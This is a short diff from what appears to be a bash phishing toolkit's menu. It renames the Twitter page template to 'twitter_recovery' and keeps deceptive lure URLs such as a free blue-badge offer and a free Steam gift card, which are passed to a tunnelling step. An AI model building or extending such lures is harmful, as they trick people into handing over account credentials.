@@ -564,7 +564,7 @@ main_menu() {
 		mask='http://steam-500-usd-gift-card-free'
 		tunnel_menu
 	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
-		website="twitter"
+		website="twitter_recovery"
 		mask='http://get-blue-badge-on-twitter-free'
 		tunnel_menu
 	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
